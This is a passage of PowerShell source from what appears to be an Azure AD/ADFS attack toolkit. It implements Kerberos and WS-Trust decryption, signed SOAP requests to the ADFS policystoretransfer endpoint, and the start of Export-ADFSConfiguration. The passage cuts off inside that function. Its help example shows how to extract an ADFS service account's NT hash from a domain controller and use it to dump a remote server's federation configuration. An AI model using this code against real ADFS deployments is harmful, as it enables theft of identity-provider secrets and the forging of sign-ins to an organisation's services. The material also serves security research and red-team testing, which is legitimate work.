            if(($enalg=[System.BitConverter]::ToInt16($SEAL_ALG,0)) -ne 0x10)
            {
                Write-Warning "Unknown SEAL_ALG ($enalg), expected RC4 (16)"
            }

            # Generate signature key by calculating MD5 HMAC from "signaturekey"+0x00 using the session key
            $Ksign = [System.Security.Cryptography.HMACMD5]::New($SessionKey).ComputeHash([text.encoding]::UTF8.GetBytes("signaturekey`0"))

            # Generate decryption keys 
            $Klocal = New-Object byte[] $SessionKey.Count
            for($a = 0 ; $a -lt $SessionKey.Count ; $a++)
            {
                $Klocal[$a] = $SessionKey[$a] -bxor 0xF0
            }

            $Kseq =   [System.Security.Cryptography.HMACMD5]::New($SessionKey).ComputeHash([byte[]]@(0x00, 0x00, 0x00, 0x00))
            $Kseq =   [System.Security.Cryptography.HMACMD5]::New($Kseq      ).ComputeHash($SGN_CHKSUM)

            $Kcrypt = [System.Security.Cryptography.HMACMD5]::New($Klocal    ).ComputeHash([byte[]]@(0x00, 0x00, 0x00, 0x00))        
            $Kcrypt = [System.Security.Cryptography.HMACMD5]::New($Kcrypt    ).ComputeHash($SND_SEQ[0..3])  

            # Decrypt sequence number
            $decSND_SEQ =        Get-RC4 -Key $Kseq   -Data $encSND_SEQ
            if(Compare-Object -ReferenceObject $decSND_SEQ -DifferenceObject $SND_SEQ -SyncWindow 0)
            {
                Write-Warning "Sequence number mismatch!"
            }

            # Decrypt data
            $decSGN_Confounder = Get-RC4 -Key $Kcrypt -Data $encSGN_Confounder
            $decData =           Get-RC4 -Key $Kcrypt -Data @($decSGN_Confounder + $encData)
            $decData =           $decData[8..($decData.Count-1)]
            $decSGN_CHKSUM =     Get-RC4 -Key $Kcrypt -Data $encSGN_CHKSUM

            # Calculate MD5 checksum: Salt + header + confounder + data
            $SGN_CHKSUM2 =  [System.Security.Cryptography.MD5    ]::Create().ComputeHash(@(@(13,0,0,0) + $TOKEN_HEADER + $decSGN_Confounder + $decData))
            $SGN_CHKSUM2 = ([System.Security.Cryptography.HMACMD5]::New($Ksign).ComputeHash($SGN_CHKSUM2))[0..7]

            if(Compare-Object -ReferenceObject $SGN_CHKSUM -DifferenceObject $SGN_CHKSUM2 -SyncWindow 0)
            {
                Write-Warning "Invalid checksum!"
            }

            return $decData
        }
        else
        {
            Throw "Unsupported GSS_WRAP type: $Type"
        }
    }
}

# pHash 
# https://www.ietf.org/rfc/rfc2246.txt
# Apr 5th 2021
function Get-PSHA1
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Secret,
        [Parameter(Mandatory=$True)]
        [byte[]]$Seed,
        [Parameter(Mandatory=$False)]
        [int]$Bytes=32
    )
    Process
    {
        [System.Security.Cryptography.HMACSHA1]$HMAC = [System.Security.Cryptography.HMACSHA1]::New($Secret)
        $PSHA1=@()

        $A = $seed
        $p = 0

        while($p -lt $Bytes)
        {
            $A = $HMAC.ComputeHash($A)
            $PSHA1 += $HMAC.ComputeHash(($A + $Seed))
            $p+=$A.Count
        }
        
        $HMAC.Dispose()

        return [byte[]]($PSHA1[0..($Bytes-1)])
    }
}

# Decrypts the given ciphertext
# Apr 9th 2021
function Decrypt-WSTrustCipherData
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$CipherText,
        [Parameter(Mandatory=$True)]
        [byte[]]$Key
    )
    Process
    {
        # The first 16 bytes are the IV
        $InitialVector = $cipherText[0..15]
        $encText =       $cipherText[16..($cipherText.Count-1)]

        # Decrypt the cipher text
        [System.Security.Cryptography.Aes]$AES = [System.Security.Cryptography.Aes]::Create()
        $AES.Mode =    "CBC"
        $AES.Key =     $Key
        $AES.IV =      $InitialVector
        $transformer = $AES.CreateDecryptor()

        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms,$transformer,[System.Security.Cryptography.CryptoStreamMode]::Write)
        $cs.Write($encText,0,$encText.Count)
        $cs.Close()
        $cs.Dispose()

        $transformedData = $ms.ToArray()
        $ms.Close()
        $ms.Dispose()

        return $transformedData
    }
}

# Encrypts the given plaintext
# Apr 10th 2021
function Encrypt-WSTrustCipherData
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$PlainText,
        [Parameter(Mandatory=$True)]
        [byte[]]$Key
    )
    Process
    {
        # Create a random IV
        $InitialVector = Get-RandomBytes -Bytes 16

        # Encrypt the cipher text
        [System.Security.Cryptography.Aes]$AES = [System.Security.Cryptography.Aes]::Create()
        $AES.Mode =    "CBC"
        $AES.Key =     $Key
        $AES.IV =      $InitialVector
        $transformer = $AES.CreateEncryptor()

        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms,$transformer,[System.Security.Cryptography.CryptoStreamMode]::Write)
        $cs.Write($PlainText,0,$PlainText.Count)
        $cs.Close()
        $cs.Dispose()

        $transformedData = $ms.ToArray()
        $ms.Close()
        $ms.Dispose()
        
        return [byte[]]($InitialVector+$transformedData)
    }
}

# Derives the key from proof token and nonce
# Apr 9th 2021
function Derive-WSTrustKey
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Key,
        [Parameter(Mandatory=$True)]
        [byte[]]$Nonce,
        [Parameter(Mandatory=$False)]
        [int]$Bytes = 32
    )
    Begin
    {
        # Default label (mis)used by Microsoft
        $Label = [text.encoding]::ASCII.GetBytes("WS-SecureConversationWS-SecureConversation")
    }
    Process
    {
        $derivedKey = Get-PSHA1 -Secret $Key -Seed ($label+$Nonce) -Bytes $Bytes
        
        return $derivedKey
    }
}

# Creates a SOAP envelope for RST
# Apr 13th 2021
function Create-RSTEnvelope
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [string]$Server,
        [Parameter(Mandatory=$True)]
        [String]$KerberosTicket
    )
    Process
    {
        $messageId = (New-Guid).ToString()
        $envelope=@"
        <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
	        <s:Header>
		        <a:Action s:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</a:Action>
		        <a:MessageID>urn:uuid:$messageId</a:MessageID>
		        <a:ReplyTo>
			        <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
		        </a:ReplyTo>
		        <a:To s:mustUnderstand="1">http://$Server/adfs/services/policystoretransfer</a:To>
	        </s:Header>
	        <s:Body>
		        <t:RequestSecurityToken Context="uuid-$((New-Guid).ToString())" xmlns:t="http://schemas.xmlsoap.org/ws/2005/02/trust">
			        <t:TokenType>http://schemas.xmlsoap.org/ws/2005/02/sc/sct</t:TokenType>
			        <t:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</t:RequestType>
			        <t:KeySize>256</t:KeySize>
			        <t:BinaryExchange ValueType="http://schemas.xmlsoap.org/ws/2005/02/trust/spnego" EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary">$KerberosTicket</t:BinaryExchange>
		        </t:RequestSecurityToken>
	        </s:Body>
        </s:Envelope>
"@

        return $envelope
    }
}

# Parse RST response
# Apr 14th 2021
function Parse-RSTR
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [xml]$RSTR,
        [Parameter(Mandatory=$True)]
        [byte[]]$Key
    )
    Process
    {
        # Extract information from the RSTR
        $krb_response =  Convert-B64ToByteArray -B64 $RSTR.Envelope.Body.RequestSecurityTokenResponseCollection.RequestSecurityTokenResponse[0].BinaryExchange.'#text'
        $proofToken =    Convert-B64ToByteArray -B64 $RSTR.Envelope.Body.RequestSecurityTokenResponseCollection.RequestSecurityTokenResponse[0].RequestedProofToken.EncryptedKey.CipherData.CipherValue
        $keyIdentifier = [guid](($RSTR.Envelope.Body.RequestSecurityTokenResponseCollection.RequestSecurityTokenResponse[0].RequestedSecurityToken.SecurityContextToken.Identifier).Split(":")[2])
        $context =       $RSTR.Envelope.Body.RequestSecurityTokenResponseCollection.RequestSecurityTokenResponse[0].RequestedSecurityToken.SecurityContextToken.Id

        # Parse the ticket
        $ticket = Parse-Asn1 -Data $krb_response

        # Get the encrypted kerberos ticket
        $encKRB = $ticket.Data.Data[2].Data.Data
        $encKRB = Parse-Asn1 -Data $encKRB
        $encKRB = $encKRB.Data[2].Data.Data[2].Data.Data[1].Data.Data

        # Decrypt the ticket
        $decKRB = Decrypt-Kerberos -Data $encKRB -Key $Key -Type APRepPart -Crypto RC4
        $decKRB = Parse-Asn1 -Data $decKRB

        # Get the sequence number and subkey
        $SequenceNumber = $decKRB.Data.Data[3].Data.Data
        $SubKey =         $decKRB.Data.Data[2].Data.Data[1].Data.Data
        $EncryptionType = $decKRB.Data.Data[2].Data.Data[0].Data.Data

        Write-Verbose "Subkey:        $(Convert-ByteArrayToB64 -Bytes $subKey)"
        Write-Verbose "Sequence num:  $sequenceNumber"

        # Extract the key from the proof token
        $securityKey = (Parse-GSS_Wrap -Type $EncryptionType -Data $proofToken -SessionKey $subKey -Direction Initiator -SequenceNumber $sequenceNumber)[0..31]

        Write-Verbose "Security key:  $(Convert-ByteArrayToB64 -Bytes $securityKey)"
        Write-Verbose "Context:       $context"
        Write-Verbose "Identifier:    $keyIdentifier"

        # Construct the return value
        $retVal = New-Object psobject -Property @{"Context" = $context; "Key" = $securityKey; "Identifier" = $keyIdentifier}

        return $retVal
    }
}

# Creates a SOAP envelope for RST SCT
# Apr 14th 2021
function Create-SCTEnvelope
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Key,
        [Parameter(Mandatory=$True)]
        [byte[]]$ClientSecret,
        [Parameter(Mandatory=$True)]
        [String]$Context,
        [Parameter(Mandatory=$True)]
        [guid]$KeyIdentifier,
        [Parameter(Mandatory=$True)]
        [string]$Server
    )
    Process
    {
        
        $payload = "<t:RequestSecurityToken xmlns:t=""http://schemas.xmlsoap.org/ws/2005/02/trust""><t:TokenType>http://schemas.xmlsoap.org/ws/2005/02/sc/sct</t:TokenType><t:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</t:RequestType><t:Entropy><t:BinarySecret Type=""http://schemas.xmlsoap.org/ws/2005/02/trust/Nonce"" u:Id=""uuid-$((New-Guid).ToString())"">$(Convert-ByteArrayToB64 -Bytes $ClientSecret)</t:BinarySecret></t:Entropy><t:KeySize>256</t:KeySize></t:RequestSecurityToken>"
        $action = "http://schemas.xmlsoap.org/ws/2005/02/trust/RST/SCT"

        $envelope = Create-ADFSSoapEnvelope -Key $Key -Context $Context -KeyIdentifier $KeyIdentifier -Server $Server -Payload $payload -Action $action

        return $envelope
    }
}

# Parse CST response
# Apr 14th 2021
function Parse-SCTR
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [xml]$SCTR,
        [Parameter(Mandatory=$True)]
        [byte[]]$Key
    )
    Process
    {
        # Parse the response and fetch the server secret
        [xml]$xPlaintext = Parse-ADFSResponse -Response $SCTR -Key $Key
        $token =           $xPlaintext.RequestSecurityTokenResponse.Entropy.BinarySecret.'#text'
        
        $serverSecret = Convert-B64ToByteArray -B64 $token
        $computedKey =  Get-PSHA1 -Secret $clientSecret -Seed $serverSecret -Bytes 32

        $context =       $xPlaintext.RequestSecurityTokenResponse.RequestedSecurityToken.SecurityContextToken.Id
        $keyIdentifier = [guid](($xPlaintext.RequestSecurityTokenResponse.RequestedSecurityToken.SecurityContextToken.Identifier).Split(":")[2])

        Write-Verbose "Server secret: $(Convert-ByteArrayToB64 -Bytes $serverSecret)"
        Write-Verbose "Computed key:  $(Convert-ByteArrayToB64 -Bytes $computedKey)"
        Write-Verbose "Context:       $context"
        Write-Verbose "Identifier:    $keyIdentifier"

        # Construct the return value
        $retVal = New-Object psobject -Property @{"Context" = $context; "Key" = $computedKey; "Identifier" = $keyIdentifier}

        return $retVal
    }
}

# Checks whether the response is a soap error
# Apr 15th 2021
function Check-SoapError
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [xml]$Message
    )
    Process
    {
        # Check for the fault message
        if($Message.Envelope.Body.Fault)
        {
            $Message = $Message.Envelope.Body.Fault.OuterXml
        }

        if($Message.Fault)
        {
            $reason = $Message.Fault.Reason.Text.'#text'
            throw $reason
        }
    }
}

# Parse ADFS Soap response
# Apr 14th 2021
function Parse-ADFSResponse
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [xml]$Response,
        [Parameter(Mandatory=$True)]
        [byte[]]$Key
    )
    Process
    {
        # Extract nonce and cipher texts
        # The first nonce is used to derive key used for ENCRYPTING, the second one is for SIGNING
        # The cipher data in header is the signature block, which is not needed here

        #$nonce0 =  Convert-B64ToByteArray -B64 $Response.Envelope.Header.Security.DerivedKeyToken[0].Nonce
        #$cipher0 = Convert-B64ToByteArray -B64 $Response.Envelope.Header.Security.EncryptedData.CipherData.CipherValue
        $nonce1 =  Convert-B64ToByteArray -B64 $Response.Envelope.Header.Security.DerivedKeyToken[1].Nonce
        $cipher1 = Convert-B64ToByteArray -B64 $Response.Envelope.Body.EncryptedData.CipherData.CipherValue

        # Derive the key
        $derivedKey = Derive-WSTrustKey -Key $Key -Nonce $nonce1

        Write-Verbose "Nonce:         $(Convert-ByteArrayToB64 -Bytes $nonce1)"
        Write-Verbose "Derived key:   $(Convert-ByteArrayToB64 -Bytes $derivedKey)"

        # Decrypt the cipher data
        #$bPlainText = Decrypt-WSTrustCipherData -CipherText $cipher0 -Key $derivedKey
        #$plainText =  [text.encoding]::UTF8.GetString($bPlainText)
        $bPlainText = Decrypt-WSTrustCipherData -CipherText $cipher1 -Key $derivedKey
        $plainText =  [text.encoding]::UTF8.GetString($bPlainText)

        Check-SoapError -Message $plainText
        
        return $plainText
    }
}

# Creates a SOAP envelope for ADFS request
# Apr 14th 2021
function Create-ADFSRequest
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Key,
        [Parameter(Mandatory=$True)]
        [String]$Context,
        [Parameter(Mandatory=$True)]
        [guid]$KeyIdentifier,
        [Parameter(Mandatory=$True)]
        [string]$Server
    )
    Process
    {
        $payload = "<GetState xmlns=""http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore""><serviceObjectType>ServiceSettings</serviceObjectType><mask xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" i:nil=""true""></mask><filter xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" i:nil=""true""></filter><clientVersionNumber>1</clientVersionNumber></GetState>"
        $action = "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetState"

        $envelope = Create-ADFSSoapEnvelope -Key $Key -Context $Context -KeyIdentifier $KeyIdentifier -Server $Server -Payload $payload -Action $action

        return $envelope
    }
}

# Invokes a ADFS SOAP request
# Apr 13th 2021
function Invoke-ADFSSoapRequest
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Key,
        [Parameter(Mandatory=$True)]
        [String]$Context,
        [Parameter(Mandatory=$True)]
        [guid]$KeyIdentifier,
        [Parameter(Mandatory=$True)]
        [string]$Server,
        [Parameter(Mandatory=$True)]
        [string]$Command
    )
    Process
    {
        # Create the envelope
        $payload =  "<GetState xmlns=""http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore""><serviceObjectType>$Command</serviceObjectType><mask xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" i:nil=""true""></mask><filter xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" i:nil=""true""></filter><clientVersionNumber>1</clientVersionNumber></GetState>"
        $action =   "http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore/IPolicyStoreReadOnlyTransfer/GetState"
        $envelope = Create-ADFSSoapEnvelope -Key $Key -Context $Context -KeyIdentifier $KeyIdentifier -Server $server -Payload $payload -Action $action

        try
        {
            [xml]$response = Invoke-RestMethod -UseBasicParsing -uri "http://$Server/adfs/services/policystoretransfer" -Method Post -Body $envelope -ContentType "application/soap+xml"
        }
        catch
        {
            # Catch the error and try to parse the SOAP document
            $str=$_.Exception.Response.GetResponseStream()
            $buf = new-object byte[] $str.Length
            $str.Position = 0
            $str.Read($buf,0,$str.Length) | Out-Null
            [xml]$response=[text.encoding]::UTF8.GetString($buf)
        }

        return Parse-ADFSResponse -Response $response -Key $Key
    }
}

# Creates a SOAP envelope for the second RST request
# Apr 13th 2021
function Create-ADFSSoapEnvelope
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Key,
        [Parameter(Mandatory=$True)]
        [String]$Context,
        [Parameter(Mandatory=$True)]
        [guid]$KeyIdentifier,
        [Parameter(Mandatory=$True)]
        [string]$Server,
        [Parameter(Mandatory=$True)]
        [string]$Payload,
        [Parameter(Mandatory=$True)]
        [string]$Action
    )
    Process
    {
        # Set some required variables
        $STSContext =   $Context
        $messageID =    (New-Guid).ToString()
        $STIdentifier = $KeyIdentifier.ToString()
        $TSIdentifier = (New-Guid).ToString()
        $now =          Get-Date
        $exp =          $now.AddMinutes(5)
        $created =      $now.ToUniversalTime().ToString("s", [cultureinfo]::InvariantCulture)+"Z"
        $expires =      $exp.ToUniversalTime().ToString("s", [cultureinfo]::InvariantCulture)+"Z"

        # Create nonce and derive keys for signing and encrypting
        $nonce0 =        Get-RandomBytes -Bytes 16
        $nonce1 =        Get-RandomBytes -Bytes 16
        $signingKey =    Derive-WSTrustKey -Key $Key -Nonce $nonce0 -Bytes 24
        $encryptionKey = Derive-WSTrustKey -Key $Key -Nonce $nonce1 -Bytes 32
        
    
        # Create the SOAP request and encrypt it
        
        $cipherText = Convert-ByteArrayToB64 -Bytes (Encrypt-WSTrustCipherData -PlainText ([text.encoding]::UTF8.GetBytes($Payload)) -Key $encryptionKey)

        #
        # Create required xml elements. 
        # Note! Due to canonicalization MS is using in the back-end, the xml MUST NOT HAVE ANY WHITE SPACES!
        # All xml elements here are already canonicalized with C14N exclusive. So, changing order of any attributes etc. will break the signature!
        #

        # Create a body element
        $xBody = "<s:Body xmlns:s=""http://www.w3.org/2003/05/soap-envelope"" xmlns:u=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"" u:Id=""_2""><e:EncryptedData xmlns:e=""http://www.w3.org/2001/04/xmlenc#"" Id=""_3"" Type=""http://www.w3.org/2001/04/xmlenc#Content""><e:EncryptionMethod Algorithm=""http://www.w3.org/2001/04/xmlenc#aes256-cbc""></e:EncryptionMethod><KeyInfo xmlns=""http://www.w3.org/2000/09/xmldsig#""><o:SecurityTokenReference xmlns:o=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd""><o:Reference URI=""#_1"" ValueType=""http://schemas.xmlsoap.org/ws/2005/02/sc/dk""></o:Reference></o:SecurityTokenReference></KeyInfo><e:CipherData><e:CipherValue>$cipherText</e:CipherValue></e:CipherData></e:EncryptedData></s:Body>"

        # Create a body element for calculating the digest. MUST BE "expanded" so that the cipher text is in decrypted form.
        $xBody2 = "<s:Body xmlns:s=""http://www.w3.org/2003/05/soap-envelope"" xmlns:u=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"" u:Id=""_2"">$Payload</s:Body>"
        
        $xTimeStamp = "<u:Timestamp xmlns:u=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"" u:Id=""uuid-$TSIdentifier-2""><u:Created>$created</u:Created><u:Expires>$expires</u:Expires></u:Timestamp>"
        $xAction =    "<a:Action xmlns:a=""http://www.w3.org/2005/08/addressing"" xmlns:s=""http://www.w3.org/2003/05/soap-envelope"" xmlns:u=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"" u:Id=""_4"" s:mustUnderstand=""1"">$Action</a:Action>"
        $xMessageId = "<a:MessageID xmlns:a=""http://www.w3.org/2005/08/addressing"" xmlns:u=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"" u:Id=""_5"">urn:uuid:$messageID</a:MessageID>"
        $xReplyTo =   "<a:ReplyTo xmlns:a=""http://www.w3.org/2005/08/addressing"" xmlns:u=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"" u:Id=""_6""><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo>"
        $xTo =        "<a:To xmlns:a=""http://www.w3.org/2005/08/addressing"" xmlns:s=""http://www.w3.org/2003/05/soap-envelope"" xmlns:u=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"" u:Id=""_7"" s:mustUnderstand=""1"">http://$Server/adfs/services/policystoretransfer</a:To>"

        # Calculate digests and generate the SignedInfo    
        $digest_2 = Convert-ByteArrayToB64 -Bytes (Get-Digest -Data     $xBody2)
        $digest_4 = Convert-ByteArrayToB64 -Bytes (Get-Digest -Data    $xAction)
        $digest_5 = Convert-ByteArrayToB64 -Bytes (Get-Digest -Data $xMessageId)
        $digest_6 = Convert-ByteArrayToB64 -Bytes (Get-Digest -Data   $xReplyTo)
        $digest_7 = Convert-ByteArrayToB64 -Bytes (Get-Digest -Data        $xTo)
        $TSdigest=  Convert-ByteArrayToB64 -Bytes (Get-Digest -Data $xTimeStamp)
        $signedInfo = "<SignedInfo xmlns=""http://www.w3.org/2000/09/xmldsig#""><CanonicalizationMethod Algorithm=""http://www.w3.org/2001/10/xml-exc-c14n#""></CanonicalizationMethod><SignatureMethod Algorithm=""http://www.w3.org/2000/09/xmldsig#hmac-sha1""></SignatureMethod><Reference URI=""#_2""><Transforms><Transform Algorithm=""http://www.w3.org/2001/10/xml-exc-c14n#""></Transform></Transforms><DigestMethod Algorithm=""http://www.w3.org/2000/09/xmldsig#sha1""></DigestMethod><DigestValue>$digest_2</DigestValue></Reference><Reference URI=""#_4""><Transforms><Transform Algorithm=""http://www.w3.org/2001/10/xml-exc-c14n#""></Transform></Transforms><DigestMethod Algorithm=""http://www.w3.org/2000/09/xmldsig#sha1""></DigestMethod><DigestValue>$digest_4</DigestValue></Reference><Reference URI=""#_5""><Transforms><Transform Algorithm=""http://www.w3.org/2001/10/xml-exc-c14n#""></Transform></Transforms><DigestMethod Algorithm=""http://www.w3.org/2000/09/xmldsig#sha1""></DigestMethod><DigestValue>$digest_5</DigestValue></Reference><Reference URI=""#_6""><Transforms><Transform Algorithm=""http://www.w3.org/2001/10/xml-exc-c14n#""></Transform></Transforms><DigestMethod Algorithm=""http://www.w3.org/2000/09/xmldsig#sha1""></DigestMethod><DigestValue>$digest_6</DigestValue></Reference><Reference URI=""#_7""><Transforms><Transform Algorithm=""http://www.w3.org/2001/10/xml-exc-c14n#""></Transform></Transforms><DigestMethod Algorithm=""http://www.w3.org/2000/09/xmldsig#sha1""></DigestMethod><DigestValue>$digest_7</DigestValue></Reference><Reference URI=""#uuid-$TSIdentifier-2""><Transforms><Transform Algorithm=""http://www.w3.org/2001/10/xml-exc-c14n#""></Transform></Transforms><DigestMethod Algorithm=""http://www.w3.org/2000/09/xmldsig#sha1""></DigestMethod><DigestValue>$TSdigest</DigestValue></Reference></SignedInfo>"

        # Generate the signature by calculating HMACSHA1 of SignedInfo using the signing key
        $HMAC = [System.Security.Cryptography.HMACSHA1]::new($signingKey)
        $signatureValue = Convert-ByteArrayToB64 -Bytes $HMAC.ComputeHash([text.encoding]::UTF8.getBytes($signedInfo))

        # Generate Signature element and encrypt it using the encryption key
        $xSignature = "<Signature xmlns=""http://www.w3.org/2000/09/xmldsig#"">$signedInfo<SignatureValue>$signatureValue</SignatureValue><KeyInfo><o:SecurityTokenReference xmlns:o=""http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd""><o:Reference ValueType=""http://schemas.xmlsoap.org/ws/2005/02/sc/dk"" URI=""#_0""/></o:SecurityTokenReference></KeyInfo></Signature>"
        $encSignature =  Convert-ByteArrayToB64 -Bytes (Encrypt-WSTrustCipherData -PlainText ([text.encoding]::UTF8.GetBytes($xSignature)) -Key $encryptionKey)

        # Create the envelope
        $envelope = @"
        <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
	        <s:Header>
		        $xAction
		        $xMessageId
		        $xReplyTo
		        $xTo
		        <o:Security s:mustUnderstand="1" xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
			        $xTimeStamp
			        <SecurityContextToken u:Id="$STSContext" xmlns="http://schemas.xmlsoap.org/ws/2005/02/sc">
				        <Identifier>urn:uuid:$STIdentifier</Identifier>
			        </SecurityContextToken>
			        <c:DerivedKeyToken u:Id="_0" xmlns:c="http://schemas.xmlsoap.org/ws/2005/02/sc">
				        <o:SecurityTokenReference>
					        <o:Reference URI="#$STSContext"/>
				        </o:SecurityTokenReference>
				        <c:Offset>0</c:Offset>
				        <c:Length>24</c:Length>
				        <c:Nonce>$(Convert-ByteArrayToB64 -Bytes $nonce0)</c:Nonce>
			        </c:DerivedKeyToken>
			        <c:DerivedKeyToken u:Id="_1" xmlns:c="http://schemas.xmlsoap.org/ws/2005/02/sc">
				        <o:SecurityTokenReference>
					        <o:Reference URI="#$STSContext"/>
				        </o:SecurityTokenReference>
				        <c:Nonce>$(Convert-ByteArrayToB64 -Bytes $nonce1)</c:Nonce>
			        </c:DerivedKeyToken>
			        <e:ReferenceList xmlns:e="http://www.w3.org/2001/04/xmlenc#">
				        <e:DataReference URI="#_3"/>
				        <e:DataReference URI="#_8"/>
			        </e:ReferenceList>
			        <e:EncryptedData Id="_8" Type="http://www.w3.org/2001/04/xmlenc#Element" xmlns:e="http://www.w3.org/2001/04/xmlenc#">
				        <e:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#aes256-cbc"/>
				        <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
					        <o:SecurityTokenReference>
						        <o:Reference ValueType="http://schemas.xmlsoap.org/ws/2005/02/sc/dk" URI="#_1"/>
					        </o:SecurityTokenReference>
				        </KeyInfo>
				        <e:CipherData>
					        <e:CipherValue>$encSignature</e:CipherValue>
				        </e:CipherData>
			        </e:EncryptedData>
		        </o:Security>
	        </s:Header>
            $xBody
        </s:Envelope>
"@

        $HMAC.Dispose()
        return $envelope
    }
}


#============================================================
# Source: ADFS.ps1
#============================================================

# Apr 21st 2021
# Exports ADFS configuration from local database or remote server
function Export-ADFSConfiguration
{
<#
    .SYNOPSIS
    Exports ADFS configuration from the local or remote ADFS server.

    .DESCRIPTION
    Exports ADFS configuration from the local ADFS server (local database) or from remote server (ADFS sync).

    .PARAMETER Local

    If provided, exports configuration from the local ADFS server

    .PARAMETER Hash

    NTHash of ADFS service user. Can be a byte array or hex string

    .PARAMETER Server

    Ip-address or FQDN of the remote ADFS server.

    .PARAMETER SID

    Security Identifier (SID) of the user (usually ADFS service user) used to dump remote configuration. Can be a byte array, string, or SID object.

    .Example
    $config = Export-IntADFSConfiguration -Local

    .Example
    Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq sv_ADFS | Format-List Name,ObjectGuid,ObjectSid
    Name       : sv_ADFS
    ObjectGuid : b6366885-73f0-4239-9cd9-4f44a0a7bc79
    ObjectSid  : S-1-5-21-2918793985-2280761178-2512057791-1134

    PS C:\>$cred = Get-Credential

    PS C:\>Get-IntADUserNTHash -ObjectGuid "b6366885-73f0-4239-9cd9-4f44a0a7bc79" -Credentials $creds -Server dc.company.com -AsHex
    6e018b0cd5b37b4fe1e0b7d54a6302b7

    PS C:\>$configuration = Export-IntADFSConfiguration -Hash "6e018b0cd5b37b4fe1e0b7d54a6302b7" -SID S-1-5-21-2918793985-2280761178-2512057791-1134 -Server sts.company.com

   
#>
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName="Local",        Mandatory = $True)]
        [switch]$Local,
        [Parameter(ParameterSetName="Sync",         Mandatory = $True)]
        [object]$Hash,
        [Parameter(ParameterSetName="Sync",         Mandatory = $True)]
        [Parameter(ParameterSetName="LoggedInUser", Mandatory = $False)]
        [String]$Server="localhost",
        [Parameter(ParameterSetName="Sync",         Mandatory = $True)]
        [object]$SID,
        [Parameter(ParameterSetName="LoggedInUser", Mandatory = $True)]
        [switch]$AsLoggedInUser
    )
    Process
    {
        if($Local) # Export configuration data from the local ADFS server
        {
            # Check that we are on ADFS server
            $service = Get-Service ADFSSRV -ErrorAction SilentlyContinue
            if($service -eq $null -or $service.Status -ne "Running")
            {
                Write-Error "This command needs to be run on AD FS server and the ADFSSRV service must be running."
                return $null
            }

            # Reference: https://github.com/Microsoft/adfsToolbox/blob/master/serviceAccountModule/Tests/Test.ServiceAccount.ps1#L199-L208

            # Get configuration data object using .NET Reflection
            $adfsProperties = Get-AdfsProperties
            $configObject   = Get-ReflectionProperty -TypeObject $adfsProperties.GetType() -ValueObject $adfsProperties -PropertyName "ServiceSettingsData"

            # Get the service using WMI to get location
            $adfsService   = Get-WmiObject -Query 'select * from win32_service where name="adfssrv"'
            $adfsDirectory = (get-item $adfsService.PathName).Directory.FullName

            # Load Microsoft.IdentityServer.dll  
            $misDll      = [IO.File]::ReadAllBytes((Join-Path -Path $adfsDirectory -ChildPath 'Microsoft.IdentityServer.dll'))
            $misAssembly = [Reflection.Assembly]::Load($misDll)
            Remove-Variable "misDll"

            # Load serializer class
